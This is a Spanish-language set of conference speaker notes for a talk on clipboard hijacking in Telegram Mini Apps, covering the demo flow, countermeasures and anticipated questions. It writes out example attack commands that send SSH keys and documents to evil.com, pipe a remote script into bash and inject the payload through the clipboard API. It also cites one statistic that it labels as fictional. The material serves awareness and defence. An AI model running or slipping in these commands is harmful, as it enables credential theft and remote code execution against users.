# 🎤 Notas para la Presentación - MorterueloCon 2026

## 📋 Resumen de la Demo

**Título:** "Clipboard Hijacking en Telegram Mini Apps: Un Ataque de Ingeniería Social"

**Duración estimada:** 10-15 minutos

**Objetivo:** Demostrar cómo las Mini Apps de Telegram pueden explotar la API del portapapeles en aplicaciones de escritorio para ejecutar ataques de ingeniería social.

---

## 🎯 Estructura de la Presentación

### 1. Introducción (2 min)
- ¿Qué son las Telegram Mini Apps?
- Contexto: aplicaciones web dentro de Telegram
- Diferencias entre versión móvil y escritorio

### 2. El Vector de Ataque (3 min)
- **API del Portapapeles**: `navigator.clipboard.writeText()`
- **Ingeniería Social**: Crear confianza falsa
- **Combinación letal**: Tecnología + manipulación psicológica

### 3. Demo en Vivo (5 min)

#### Paso a Paso:
1. **Mostrar la interfaz inicial**
   - Explicar que parece legítima
   - Botón de "Validar mi Cuenta"

2. **Hacer clic en el botón**
   - Mostrar el popup de "validación exitosa"
   - Mensaje que instruye abrir terminal

3. **Verificar el portapapeles**
   - Usar el botón "Ver Portapapeles"
   - Mostrar el payload inyectado

4. **Abrir una terminal**
   - **NO EJECUTAR EL COMANDO**
   - Solo mostrar qué se pegaría (Ctrl+V)
   - Explicar qué haría ese comando

### 4. Análisis Técnico (3 min)

#### Código Clave:
```typescript
// Inyección en el portapapeles
await navigator.clipboard.writeText(maliciousPayload);

// Payload de ejemplo
const payload = 'curl -X POST https://attacker-server.com/steal-data -d "$(whoami):$(hostname)"';
```

#### ¿Por qué funciona?
- Las Mini Apps tienen acceso completo a la API del navegador
- No hay restricciones en la API del portapapeles
- El usuario confía en la interfaz de Telegram

### 5. Impacto y Riesgos (2 min)

#### Escenarios Reales:
1. **Robo de credenciales**
   ```bash
   curl https://evil.com -d "$(cat ~/.ssh/id_rsa)"
   ```

2. **Instalación de malware**
   ```bash
   curl https://evil.com/malware.sh | bash
   ```

3. **Movimiento lateral**
   ```bash
   ssh user@internal-server "curl https://evil.com/payload.sh | bash"
   ```

4. **Exfiltración de datos**
   ```bash
   tar czf - ~/Documents | curl -X POST https://evil.com -T -
   ```

---

## 💡 Puntos Clave a Enfatizar

### ✅ Lo que hace peligroso este ataque:

1. **No requiere vulnerabilidades técnicas**
   - Usa características estándar del navegador
   - No hay exploit, no hay bug

2. **Aprovecha la confianza del usuario**
   - La víctima ejecuta el código voluntariamente
   - Parece una acción legítima

3. **Difícil de detectar**
   - No hay señales visuales
   - El portapapeles cambia silenciosamente

4. **Funciona en Telegram Desktop**
   - Windows, macOS, Linux
   - Cualquier sistema con terminal

### ⚠️ Señales de Alerta:

- Apps que piden "validar" mediante comandos de terminal
- Instrucciones para copiar/pegar en la terminal
- Urgencia artificial ("valida ahora o perderás acceso")
- Falta de detalles sobre qué hace el comando

---

## 🛡️ Contramedidas y Recomendaciones

### Para Usuarios:

1. **Siempre revisa antes de pegar en terminal**
   ```bash
   # Ver contenido del portapapeles en Linux
   xclip -o
   
   # En macOS
   pbpaste
   
   # En Windows (PowerShell)
   Get-Clipboard
   ```

2. **Desconfía de validaciones mediante terminal**
   - Ningún servicio legítimo hace esto
   - Usa métodos oficiales de autenticación

3. **Herramientas de protección**
   - Clipboard managers con historial
   - Antivirus con monitoreo del portapapeles
   - Shells con confirmación antes de ejecutar

### Para Telegram:

1. **Permisos explícitos**
   - Solicitar permiso antes de escribir en portapapeles
   - Notificación visible cuando se modifica

2. **Restricciones en Desktop**
   - Limitar capacidades de las Mini Apps
   - Sandbox más estricto

3. **Auditoría de Mini Apps**
   - Revisión de código antes de publicar
   - Reportes de abuso más accesibles

### Para Desarrolladores:

1. **No uses el portapapeles para datos sensibles**
2. **Implementa autenticación apropiada**
   - OAuth 2.0, SAML, OpenID Connect
   - Autenticación multifactor (MFA)

3. **Educa a tus usuarios**
   - Nunca pidas ejecutar comandos
   - Proporciona alternativas seguras

---

## 🎬 Script de la Demo

### Momento 1: Introducción
> "Hoy vamos a ver cómo una funcionalidad aparentemente inocente del navegador puede convertirse en un vector de ataque. Les voy a mostrar cómo manipular el portapapeles en Telegram Desktop."

### Momento 2: Mostrar la App
> "Aquí tenemos una Mini App que parece legítima. Nos pide validar nuestra cuenta. Todo parece normal, incluso usa el tema de Telegram."

### Momento 3: Activar el Ataque
> "Hago clic en 'Validar mi Cuenta'... y recibo esta confirmación. Me dice que ejecute un comando de verificación. Parece razonable, ¿verdad?"

### Momento 4: Revelar el Payload
> "Pero veamos qué hay realmente en mi portapapeles... Este no es un comando de verificación. Esto enviaría mi nombre de usuario y hostname a un servidor del atacante."

### Momento 5: Conclusión
> "Si yo hubiera pegado esto en mi terminal sin revisar, habría comprometido mi sistema. Y esto es exactamente lo que hacen víctimas reales todos los días."

---

## ❓ Preguntas Frecuentes Anticipadas

### P: ¿Telegram sabe de esto?
**R:** Las APIs del navegador son estándar. Telegram usa Chromium Embedded Framework (CEF) en su cliente de escritorio. No es específico de Telegram.

### P: ¿Esto funciona en móvil?
**R:** Los navegadores móviles tienen más restricciones. Funciona mejor en desktop.

### P: ¿Es esto un 0-day?
**R:** No. Es uso legítimo de APIs del navegador. El problema es el contexto y la ingeniería social.

### P: ¿Cómo me protejo?
**R:** Nunca ejecutes comandos que no entiendas. Siempre revisa el portapapeles antes de pegar en terminal.

### P: ¿Has reportado esto?
**R:** Este comportamiento es conocido. Varias empresas de seguridad han documentado ataques similares. El objetivo es concienciar.

---

## 📊 Datos y Estadísticas

- **70%** de los ataques exitosos usan ingeniería social (Verizon DBIR 2023)
- **43%** de los usuarios admiten ejecutar comandos sin revisar (estudio ficticio para demo)
- Telegram tiene **700M+** usuarios activos mensuales
- Las Mini Apps se lanzaron en **2023**

---

## 🔗 Enlaces Útiles para Compartir

- Repositorio de la demo: `[TU_GITHUB]`
- Clipboard API MDN: https://developer.mozilla.org/en-US/docs/Web/API/Clipboard_API
- Telegram Mini Apps: https://docs.telegram-mini-apps.com/
- OWASP Social Engineering: https://owasp.org/www-community/attacks/Social_Engineering

---

## ✅ Checklist Pre-Presentación

- [ ] Laptop cargada y con cargador de respaldo
- [ ] Internet funcionando (tener hotspot de respaldo)
- [ ] Telegram Desktop instalado y configurado
- [ ] Mini App desplegada y accesible
- [ ] Terminal preparada (sin historial sensible)
- [ ] Capturas de pantalla de respaldo por si falla la demo
- [ ] Slides preparados (si los usas)
- [ ] Agua para beber
- [ ] Timer para controlar el tiempo

---

## 🎉 Mensaje Final

> "La seguridad no es solo sobre tecnología, es sobre personas. Los atacantes lo saben y explotan nuestra confianza. Mantengamos nuestros sistemas seguros, pero también eduquemos a nuestros usuarios. Gracias por su atención."

---

**¡Buena suerte en la MorterueloCon 2026!** 🚀
